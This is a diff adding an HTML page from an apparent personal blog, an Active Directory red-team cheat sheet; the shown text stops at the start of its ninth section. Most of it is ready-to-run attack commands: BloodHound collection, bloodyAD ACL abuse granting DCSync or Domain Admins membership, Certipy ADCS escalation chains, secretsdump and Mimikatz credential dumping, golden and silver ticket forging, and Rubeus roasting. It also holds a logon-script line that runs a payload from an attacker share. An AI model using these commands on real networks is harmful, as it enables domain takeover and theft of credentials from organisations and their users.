@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>hd's blog // Active Directory Cheat Sheet</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible+Mono:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/stuff.css">
+    <style>
+        /* ── Arctic blue / silver theme override ── */
+        :root {
+            --green:         #7dd3fc;
+            --green-bright:  #bae6fd;
+            --green-dim:     #38bdf8;
+            --green-soft:    #0284c7;
+            --green-ghost:   rgba(125,211,252,0.30);
+            --text:          #b0cfe8;
+            --text-dim:      #3d6070;
+            --glow:          0 0 4px rgba(125,211,252,0.55), 0 0 12px rgba(125,211,252,0.22);
+            --glow-strong:   0 0 6px rgba(125,211,252,0.8), 0 0 22px rgba(125,211,252,0.4), 0 0 44px rgba(125,211,252,0.18);
+            --panel-edge:    rgba(125,211,252,0.18);
+            --panel:         rgba(6,16,28,0.60);
+            --bg-base:       #050c14;
+            --bg-deep:       #020609;
+        }
+        body {
+            background:
+                radial-gradient(ellipse 120% 80% at 50% -10%, rgba(56,189,248,0.07), transparent 60%),
+                radial-gradient(ellipse 100% 60% at 50% 120%, rgba(14,116,144,0.05), transparent 60%),
+                var(--bg-base) !important;
+        }
+        /* silver-blue sweep for h2 headings */
+        .shine {
+            background: linear-gradient(
+                100deg,
+                #3a5060 0%,
+                #7dd3fc 28%,
+                #e4f4ff 46%,
+                #ffffff 50%,
+                #e4f4ff 54%,
+                #94a3b8 72%,
+                #3a5060 100%
+            ) !important;
+            background-size: 220% 100% !important;
+            -webkit-background-clip: text !important;
+            background-clip: text !important;
+            -webkit-text-fill-color: transparent !important;
+            color: transparent !important;
+            filter: drop-shadow(0 0 6px rgba(125,211,252,0.25)) !important;
+            animation: silver-wave 4.5s ease-in-out infinite !important;
+        }
+        /* blue traffic-light dot */
+        .green { background: var(--green-dim) !important; box-shadow: 0 0 6px var(--green-dim) !important; }
+        /* decision map accent */
+        .dm-row { border-left-color: var(--green-soft); }
+        /* toc links */
+        .toc-grid a:hover { color: var(--green-bright); }
+        .toc-grid .toc-num { color: var(--green-soft); }
+        /* tip/note recolour */
+        .tip { border-color: rgba(125,211,252,0.2); background: rgba(125,211,252,0.05); }
+        .tip::before { color: var(--green-bright); }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="beam"></div>
+    <div class="crt"></div>
+    <div id="boot"></div>
+
+    <!-- set blue matrix rain before terminal.js loads -->
+    <script>
+        window.matrixColor     = '#38bdf8';
+        window.matrixColorHigh = '#bae6fd';
+    </script>
+
+    <div id="wrapper">
+        <header>
+            <img src="/logo.png" alt="hd's blog" class="logo"/>
+            <h1 class="glitch" data-text="Active Directory Cheat Sheet"><i>Active Directory Cheat Sheet</i></h1>
+        </header>
+
+        <main>
+            <nav>
+                <a href="/index.html">Main page</a>
+                <a href="/writeups.html">Writeups</a>
+                <a href="/blog.html">Blog</a>
+            </nav>
+
+            <div class="resource-meta">
+                <span class="badge">Blog</span>
+                <span class="badge">Active Directory</span>
+                <span class="badge">Red Team</span>
+                <span class="tag">Kerberos</span>
+                <span class="tag">ADCS</span>
+                <span class="tag">ACL abuse</span>
+                <span class="tag">BloodHound</span>
+                <span class="tag">Impacket</span>
+            </div>
+
+            <!-- TOC -->
+            <h2><span class="shine">Contents</span></h2>
+            <div class="terminal">
+                <div class="buttons"><span class="red"></span><span class="yellow"></span><span class="green"></span></div>
+                <p class="command" data-cmd="cat adcheatsheet.md | grep '^##'"></p>
+                <p class="output">
+                    <div class="toc-grid">
+                        <a href="#s01"><span class="toc-num">01.</span>BloodHound Collection</a>
+                        <a href="#s02"><span class="toc-num">02.</span>BloodHound — Common Errors</a>
+                        <a href="#s03"><span class="toc-num">03.</span>bloodyAD.py — ACL Object Manipulation</a>
+                        <a href="#s04"><span class="toc-num">04.</span>Kerberos Ticket Operations</a>
+                        <a href="#s05"><span class="toc-num">05.</span>Certipy — ADCS Attacks</a>
+                        <a href="#s06"><span class="toc-num">06.</span>secretsdump.py</a>
+                        <a href="#s07"><span class="toc-num">07.</span>Mimikatz</a>
+                        <a href="#s08"><span class="toc-num">08.</span>Rubeus.exe</a>
+                        <a href="#s09"><span class="toc-num">09.</span>ACL-Based Shell Access</a>
+                        <a href="#s10"><span class="toc-num">10.</span>AD Rights &amp; Privileges → Privesc</a>
+                    </div>
+                </p>
+            </div>
+
+            <!-- 01 BloodHound collect -->
+            <details id="s01" open>
+                <summary><span class="sum-num">01</span><span class="sum-title">BloodHound Collection (bloodhound.py)</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># Standard — collect everything</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All
+
+<span class="cm"># Specific collection methods (faster / less noise)</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c DCOnly              # DC objects only — fast, low noise
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c Session,Trusts      # sessions + trust relationships
+
+<span class="cm"># NTLM hash instead of password</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username \
+  --hashes :NTLMHASH -ns &lt;DC_IP&gt; -c All
+
+<span class="cm"># Kerberos ticket (CCACHE) — no password on the wire</span>
+export KRB5CCNAME=/path/to/ticket.ccache
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -k --no-pass \
+  -ns &lt;DC_IP&gt; -c All
+
+<span class="cm"># Specify DC hostname explicitly</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  --dc DC01.DOMAIN.LOCAL -ns &lt;DC_IP&gt; -c All
+
+<span class="cm"># Custom output directory + auto-zip for BloodHound import</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All -o ./bh_out/ --zip</pre>
+                    <div class="tip">Load the resulting JSON/zip files into the BloodHound GUI: Database → Upload Data. Use the "Shortest Paths to Domain Admins" pre-built query as a starting point.</div>
+                </div>
+            </details>
+
+            <!-- 02 BloodHound errors -->
+            <details id="s02">
+                <summary><span class="sum-num">02</span><span class="sum-title">BloodHound — Common Errors &amp; Fixes</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># ── Error: DNS resolution failure ────────────────────────────────────────────</span>
+<span class="cm"># Symptom: &quot;Could not find domain controller&quot;, &quot;NXDOMAIN&quot;, &quot;Name or service not known&quot;</span>
+<span class="cm"># Fix: always pass -ns pointing at the DC</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All
+
+<span class="cm"># Or add the DC to /etc/resolv.conf temporarily</span>
+echo &quot;nameserver &lt;DC_IP&gt;&quot; | sudo tee -a /etc/resolv.conf
+
+<span class="cm"># ── Error: Clock skew / KRB_AP_ERR_SKEW ──────────────────────────────────────</span>
+<span class="cm"># Symptom: Kerberos auth fails with clock skew error</span>
+sudo ntpdate &lt;DC_IP&gt;           # sync clock to DC
+sudo timedatectl set-ntp false
+sudo date -s &quot;$(net time -S &lt;DC_IP&gt;)&quot;   # or use net time
+
+<span class="cm"># ── Error: LDAP query failed / connection reset ───────────────────────────────</span>
+<span class="cm"># Symptom: collection hangs or returns 0 objects</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All --auth-method ntlm    # force NTLM (default may try Kerberos)
+
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All --dns-tcp             # use TCP for DNS (firewalled UDP)
+
+<span class="cm"># ── Error: &quot;Connection refused&quot; on port 389 ───────────────────────────────────</span>
+<span class="cm"># LDAP may be blocked — try LDAPS (636)</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All -p 636 --secure       # TLS / LDAPS
+
+<span class="cm"># ── Error: STATUS_LOGON_FAILURE / bad credentials ────────────────────────────</span>
+<span class="cm"># Verify creds first:</span>
+crackmapexec smb &lt;DC_IP&gt; -u username -p &#x27;Password123&#x27;
+<span class="cm"># Check for account lockout policy before brute-forcing</span>
+
+<span class="cm"># ── Error: empty or partial JSON output ──────────────────────────────────────</span>
+<span class="cm"># Symptom: files created but few/no objects collected</span>
+python3 bloodhound.py -d DOMAIN.LOCAL -u username -p &#x27;Password123&#x27; \
+  -ns &lt;DC_IP&gt; -c All --disable-pooling -w 1   # single-threaded, no pool</pre>
+                </div>
+            </details>
+
+            <!-- 03 bloodyAD -->
+            <details id="s03">
+                <summary><span class="sum-num">03</span><span class="sum-title">bloodyAD.py — ACL Object Manipulation</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>All commands assume <code>-d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP</code>. Swap <code>-p 'PASS'</code> for <code>--hashes :NTLMHASH</code> or <code>-k</code> (Kerberos with <code>KRB5CCNAME</code> set).</p>
+                    <pre class="cb"><span class="cm"># ─────────────────────────────────────────────────────────────────────────────</span>
+<span class="cm"># SYNTAX:  python3 bloodyAD.py -d DOMAIN.LOCAL -u USER -p &#x27;PASS&#x27; --host DC_IP</span>
+<span class="cm"># Also accepts: --hashes LMHASH:NTLMHASH   or   -k (Kerberos w/ KRB5CCNAME)</span>
+<span class="cm"># ─────────────────────────────────────────────────────────────────────────────</span>
+
+<span class="cm"># ── GET — read object attributes ──────────────────────────────────────────────</span>
+python3 bloodyAD.py [...] get object TARGET_USER \
+  --attr memberOf,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity
+
+python3 bloodyAD.py [...] get object &quot;Domain Admins&quot; --attr member
+
+<span class="cm"># ── SET PASSWORD (GenericAll / ForceChangePassword) ───────────────────────────</span>
+python3 bloodyAD.py [...] set password TARGET_USER &#x27;NewPassword123!&#x27;
+
+<span class="cm"># ── SET SPN — targeted Kerberoasting (GenericWrite / GenericAll on user) ──────</span>
+python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName \
+  -v &#x27;MSSQLSvc/fake.domain.local:1433&#x27;
+
+<span class="cm"># Remove the SPN after attack (cleanup)</span>
+python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v &#x27;&#x27;
+
+<span class="cm"># ── SHADOW CREDENTIALS — add KeyCredential (GenericWrite / GenericAll) ────────</span>
+python3 bloodyAD.py [...] set shadowCredentials TARGET_USER
+<span class="cm"># Then authenticate:  certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP</span>
+
+<span class="cm"># ── ADD / REMOVE GROUP MEMBER (GenericAll / Self / AddMember on group) ────────</span>
+python3 bloodyAD.py [...] add groupMember &quot;Domain Admins&quot; TARGET_USER
+python3 bloodyAD.py [...] remove groupMember &quot;Domain Admins&quot; TARGET_USER
+
+<span class="cm"># ── GRANT DCSync (WriteDACL on domain) ────────────────────────────────────────</span>
+python3 bloodyAD.py [...] add dcsync TARGET_USER
+
+<span class="cm"># ── RBCD — Resource-Based Constrained Delegation (GenericWrite on computer) ───</span>
+<span class="cm"># Grant ATTACKER_MACHINE$ the right to impersonate users on TARGET_MACHINE$</span>
+python3 bloodyAD.py [...] set rbcd TARGET_MACHINE$ ATTACKER_MACHINE$
+
+<span class="cm"># Clear RBCD after attack</span>
+python3 bloodyAD.py [...] remove rbcd TARGET_MACHINE$ ATTACKER_MACHINE$
+
+<span class="cm"># ── UAC FLAGS (GenericAll) ─────────────────────────────────────────────────────</span>
+python3 bloodyAD.py [...] set uac TARGET_USER -f ACCOUNTDISABLE      # disable
+python3 bloodyAD.py [...] set uac TARGET_USER -f DONT_REQ_PREAUTH    # ASREPRoastable
+
+<span class="cm"># ── LOGON SCRIPT (GenericWrite — code exec on next logon) ─────────────────────</span>
+python3 bloodyAD.py [...] set object TARGET_USER scriptPath \
+  -v &#x27;\\ATTACKER_IP\share\payload.bat&#x27;
+
+<span class="cm"># ── RESTORE DELETED OBJECT ────────────────────────────────────────────────────</span>
+<span class="cm"># First find deleted objects (requires Recycle Bin feature enabled)</span>
+python3 bloodyAD.py [...] get object \
+  &quot;CN=DeletedUser,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL&quot; --attr *
+
+python3 bloodyAD.py [...] restore object \
+  &quot;CN=DeletedUser\0ADEL:guid,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL&quot;
+
+<span class="cm"># ── COMPUTER OBJECT — create machine account (MachineAccountQuota &gt; 0) ────────</span>
+python3 bloodyAD.py [...] add computer ATTACKER_MACHINE$ &#x27;MachinePass123!&#x27;
+
+<span class="cm"># ── GENERIC ATTRIBUTE WRITE ───────────────────────────────────────────────────</span>
+python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
+  -v &#x27;Kerberos:cn=attacker,cn=users,dc=domain,dc=local&#x27;</pre>
+                </div>
+            </details>
+
+            <!-- 04 Kerberos -->
+            <details id="s04">
+                <summary><span class="sum-num">04</span><span class="sum-title">Kerberos Ticket Operations</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># ── getTGT.py ─────────────────────────────────────────────────────────────────</span>
+<span class="cm"># Password</span>
+python3 getTGT.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP
+
+<span class="cm"># NTLM hash (Pass-the-Hash → TGT)</span>
+python3 getTGT.py DOMAIN.LOCAL/username -hashes :NTLMHASH -dc-ip DC_IP
+
+<span class="cm"># AES key (Pass-the-Key — more OPSEC)</span>
+python3 getTGT.py DOMAIN.LOCAL/username -aesKey AES256KEY -dc-ip DC_IP
+
+<span class="cm"># Output file name</span>
+python3 getTGT.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP \
+  -o custom_name.ccache
+
+<span class="cm"># ── getST.py — Service Ticket (TGS) ──────────────────────────────────────────</span>
+<span class="cm"># Request a TGS for a specific SPN</span>
+python3 getST.py DOMAIN.LOCAL/username:&#x27;Password123&#x27; \
+  -spn MSSQLSvc/server.domain.local -dc-ip DC_IP
+
+<span class="cm"># S4U2Self + S4U2Proxy — impersonate Administrator via RBCD / constrained deleg</span>
+python3 getST.py DOMAIN.LOCAL/machine$:&#x27;MachinePass123!&#x27; \
+  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
+
+<span class="cm"># With hash</span>
+python3 getST.py DOMAIN.LOCAL/machine$ -hashes :MACHINEPASSHASH \
+  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
+
+<span class="cm"># ── KRB5CCNAME — exporting and using tickets ──────────────────────────────────</span>
+<span class="cm"># Export ticket for all impacket / bloodyAD tools</span>
+export KRB5CCNAME=/path/to/username.ccache
+
+<span class="cm"># Use with impacket</span>
+python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+python3 smbexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
+
+<span class="cm"># Use with crackmapexec</span>
+export KRB5CCNAME=admin.ccache
+crackmapexec smb TARGET_IP --kerberos -u Administrator -d DOMAIN.LOCAL
+
+<span class="cm"># List current tickets</span>
+klist
+
+<span class="cm"># Destroy all tickets</span>
+kdestroy
+
+<span class="cm"># ── ticketConverter.py — CCACHE ↔ Kirbi ──────────────────────────────────────</span>
+python3 ticketConverter.py ticket.ccache ticket.kirbi   # → Kirbi for Rubeus
+python3 ticketConverter.py ticket.kirbi  ticket.ccache  # → CCACHE for Linux</pre>
+                    <div class="tip">After exporting <code>KRB5CCNAME</code>, every Impacket tool with <code>-k -no-pass</code> will use the ticket automatically. No password goes on the wire.</div>
+                </div>
+            </details>
+
+            <!-- 05 Certipy -->
+            <details id="s05">
+                <summary><span class="sum-num">05</span><span class="sum-title">Certipy — ADCS Attacks</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>Always start with <code>certipy find -vulnerable</code> to identify the ESC class before running the matching exploit chain.</p>
+                    <pre class="cb"><span class="cm"># ── Enumerate ADCS — find CA and templates ────────────────────────────────────</span>
+certipy find -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; -dc-ip DC_IP
+
+<span class="cm"># Show only vulnerable templates to stdout (no output files)</span>
+certipy find -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -dc-ip DC_IP -vulnerable -stdout
+
+<span class="cm"># With hash</span>
+certipy find -u username@DOMAIN.LOCAL -hashes :NTLMHASH -dc-ip DC_IP -vulnerable
+
+<span class="cm"># ── ESC1 — Enrollee Supplies Subject + allow SAN ─────────────────────────────</span>
+<span class="cm"># Request cert as Administrator (arbitrary SAN)</span>
+certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;VulnerableTemplate&#x27; \
+  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP
+
+<span class="cm"># ── ESC2 — Any Purpose EKU or No EKU ─────────────────────────────────────────</span>
+certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;VulnerableTemplate&#x27; -dc-ip DC_IP
+
+<span class="cm"># ── ESC3 — Certificate Request Agent (enroll on behalf of) ───────────────────</span>
+<span class="cm"># Step 1: obtain enrollment agent cert</span>
+certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;EnrollmentAgent&#x27; -dc-ip DC_IP
+
+<span class="cm"># Step 2: request cert on behalf of Administrator</span>
+certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;User&#x27; \
+  -on-behalf-of &#x27;DOMAIN\Administrator&#x27; -pfx enrollment_agent.pfx -dc-ip DC_IP
+
+<span class="cm"># ── ESC4 — Vulnerable Template ACLs (WriteDacl/WriteOwner on template) ────────</span>
+<span class="cm"># Save old template config and overwrite to ESC1</span>
+certipy template -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -template &#x27;VulnerableTemplate&#x27; -save-old -dc-ip DC_IP
+
+<span class="cm"># Then exploit as ESC1, then restore</span>
+certipy template -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -template &#x27;VulnerableTemplate&#x27; -configuration old.json -dc-ip DC_IP
+
+<span class="cm"># ── ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA ─────────────────────────</span>
+<span class="cm"># Same as ESC1 — CA allows SAN on any template</span>
+certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;User&#x27; \
+  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP
+
+<span class="cm"># ── ESC7 — Manage CA / Manage Certificates right ─────────────────────────────</span>
+certipy ca -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -add-officer username -dc-ip DC_IP
+certipy ca -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -enable-template &#x27;SubCA&#x27; -dc-ip DC_IP
+
+<span class="cm"># ── ESC8 — NTLM relay to AD CS HTTP endpoint ─────────────────────────────────</span>
+certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController
+
+<span class="cm"># ── Authenticate with certificate (PKINIT → get hash + TGT) ─────────────────</span>
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+<span class="cm"># → dumps administrator hash + saves .ccache ticket</span>
+
+<span class="cm"># ── Shadow Credentials via ADCS (auto — requires GenericWrite on target) ──────</span>
+certipy shadow auto -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -account TARGET_USER -dc-ip DC_IP</pre>
+                    <div class="tip"><code>certipy auth</code> against a vulnerable CA yields both the NTLM hash and a <code>.ccache</code> TGT in one step — no password needed after that point.</div>
+                </div>
+            </details>
+
+            <!-- 06 secretsdump -->
+            <details id="s06">
+                <summary><span class="sum-num">06</span><span class="sum-title">secretsdump.py</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <pre class="cb"><span class="cm"># ── Remote DCSync — dump all domain hashes ───────────────────────────────────</span>
+python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP
+
+<span class="cm"># With NTLM hash</span>
+python3 secretsdump.py DOMAIN.LOCAL/username@DC_IP \
+  -hashes LMHASH:NTLMHASH
+
+<span class="cm"># With Kerberos ticket</span>
+export KRB5CCNAME=admin.ccache
+python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
+
+<span class="cm"># Dump only a specific account</span>
+python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -just-dc-user Administrator
+
+<span class="cm"># NTLM hashes only (skip LSA secrets, faster)</span>
+python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -just-dc-ntlm
+
+<span class="cm"># ── Remote SAM dump — non-DC machine ─────────────────────────────────────────</span>
+python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@MACHINE_IP
+
+<span class="cm"># ── Offline — from registry hive files (reg save) ────────────────────────────</span>
+<span class="cm"># First on target: reg save HKLM\SAM SAM &amp;&amp; reg save HKLM\SYSTEM SYSTEM</span>
+python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+<span class="cm"># ── Offline — from NTDS.dit (grabbed via VSS / Backup Operators) ─────────────</span>
+python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+<span class="cm"># ── Output to file ────────────────────────────────────────────────────────────</span>
+python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
+  -outputfile domain_hashes</pre>
+                </div>
+            </details>
+
+            <!-- 07 Mimikatz -->
+            <details id="s07">
+                <summary><span class="sum-num">07</span><span class="sum-title">Mimikatz</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>Run from an elevated prompt. <code>privilege::debug</code> is required before most commands. Use <code>.\mimikatz.exe</code> in PowerShell (bare name invokes <code>Set-Alias</code>).</p>
+                    <pre class="cb"><span class="cm"># ── Elevation and basic setup ────────────────────────────────────────────────</span>
+privilege::debug                        # enable SeDebugPrivilege (required for most)
+token::elevate                          # impersonate SYSTEM token
+
+<span class="cm"># ── Credential Dumping ────────────────────────────────────────────────────────</span>
+sekurlsa::logonpasswords                # dump all logged-on creds from LSASS
+sekurlsa::wdigest                       # dump WDigest (plaintext on older OS)
+sekurlsa::kerberos                      # dump Kerberos tickets from LSASS
+sekurlsa::dpapi                         # dump DPAPI master keys from memory
+
+<span class="cm"># Dump from LSASS minidump (offline / EDR bypass)</span>
+sekurlsa::minidump C:\lsass.dmp         # point at dump file (ABSOLUTE path)
+sekurlsa::logonpasswords                # parse the dump
+
+<span class="cm"># Local SAM and LSA secrets</span>
+lsadump::sam                            # local SAM hashes
+lsadump::secrets                        # LSA secrets (service account plaintexts)
+lsadump::cache                          # cached domain credentials (DCC2 hashes)
+
+<span class="cm"># ── DCSync — pull any account&#x27;s hash from a DC ───────────────────────────────</span>
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
+lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv   # dump everything to CSV
+
+<span class="cm"># ── Pass the Hash ─────────────────────────────────────────────────────────────</span>
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
+  /ntlm:NTLMHASH /run:cmd.exe           # spawn cmd.exe as that user
+
+<span class="cm"># Overpass the Hash (Pass-the-Key — AES for better OPSEC)</span>
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
+  /aes256:AES256KEY /run:powershell.exe
+
+<span class="cm"># ── Kerberos Ticket Manipulation ──────────────────────────────────────────────</span>
+kerberos::list                          # list all tickets in memory
+kerberos::list /export                  # export tickets to .kirbi files
+kerberos::purge                         # purge all tickets
+kerberos::ptt ticket.kirbi              # pass-the-ticket (import .kirbi)
+
+<span class="cm"># Golden Ticket — forge TGT with krbtgt hash (persistence)</span>
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
+  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+  /krbtgt:KRBTGT_NTLMHASH /id:500
+
+<span class="cm"># Silver Ticket — forge TGS for specific service</span>
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
+  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+  /target:DC01.DOMAIN.LOCAL /service:cifs \
+  /rc4:MACHINE_NTLMHASH /id:500</pre>
+                </div>
+            </details>
+
+            <!-- 08 Rubeus -->
+            <details id="s08">
+                <summary><span class="sum-num">08</span><span class="sum-title">Rubeus.exe</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>All Rubeus operations are in-process (.NET) — no LSASS handle is opened for most tasks, making it more OPSEC-friendly than Mimikatz for ticket work.</p>
+                    <pre class="cb"><span class="cm"># ── Kerberoasting ────────────────────────────────────────────────────────────</span>
+Rubeus.exe kerberoast /outfile:hashes.txt                   # all SPNs
+Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt        # specific user
+Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt         # RC4 downgrade avoidance
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt         # request RC4 explicitly
+
+<span class="cm"># ── AS-REP Roasting ──────────────────────────────────────────────────────────</span>
+Rubeus.exe asreproast /outfile:asrep.txt                    # all DONT_REQ_PREAUTH
+Rubeus.exe asreproast /user:target /outfile:asrep.txt       # specific user
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt    # hashcat format
+
+<span class="cm"># ── Request TGT ───────────────────────────────────────────────────────────────</span>
+Rubeus.exe asktgt /user:username /password:Password123 \
+  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap
+
+<span class="cm"># With NTLM hash (Overpass-the-Hash)</span>
+Rubeus.exe asktgt /user:username /rc4:NTLMHASH \
+  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap
+
+<span class="cm"># With AES key (better OPSEC)</span>
+Rubeus.exe asktgt /user:username /aes256:AES256KEY \
+  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /opsec
+
+<span class="cm"># ── Pass-the-Ticket ───────────────────────────────────────────────────────────</span>
+Rubeus.exe ptt /ticket:BASE64TICKETBLOB==          # import from base64
+Rubeus.exe ptt /ticket:C:\ticket.kirbi             # import from file
+Rubeus.exe triage                                  # list all tickets in all sessions
+Rubeus.exe dump                                    # dump all tickets
+Rubeus.exe dump /user:Administrator /service:krbtgt /nowrap   # specific ticket
+Rubeus.exe purge                                   # delete all tickets
+
+<span class="cm"># ── S4U — constrained delegation / RBCD ──────────────────────────────────────</span>
+<span class="cm"># Full S4U chain: impersonate Administrator → CIFS on target</span>
+Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
+  /impersonateuser:Administrator \
+  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
+  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /ptt
+
+<span class="cm"># With existing TGT</span>
+Rubeus.exe s4u /ticket:machine_tgt.kirbi \
+  /impersonateuser:Administrator \
+  /msdsspn:cifs/TARGET.DOMAIN.LOCAL /ptt
+
+<span class="cm"># ── Golden / Silver Tickets ───────────────────────────────────────────────────</span>
+Rubeus.exe golden /user:Administrator /id:500 \
+  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+  /krbtgt:KRBTGT_HASH /nowrap /ptt
+
+Rubeus.exe silver /user:Administrator /id:500 \
+  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+  /service:cifs /rc4:MACHINE_HASH \
+  /target:TARGET.DOMAIN.LOCAL /nowrap /ptt
+
+<span class="cm"># ── Monitoring (unconstrained delegation / credential capture) ────────────────</span>
+Rubeus.exe monitor /interval:5 /nowrap             # watch for new TGTs
+Rubeus.exe monitor /targetuser:DC01$ /interval:5  # watch for specific user
+Rubeus.exe harvest /interval:30                    # auto-renew harvested TGTs</pre>
+                    <div class="tip"><code>/nowrap</code> prints the base64 ticket as one line — pipe directly into <code>Rubeus.exe ptt /ticket:&lt;base64&gt;</code> or save for later use.</div>
+                </div>
+            </details>
+
+            <!-- 09 ACL shell -->
+            <details id="s09">
+                <summary><span class="sum-num">09</span><span class="sum-title">ACL-Based Shell Access</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
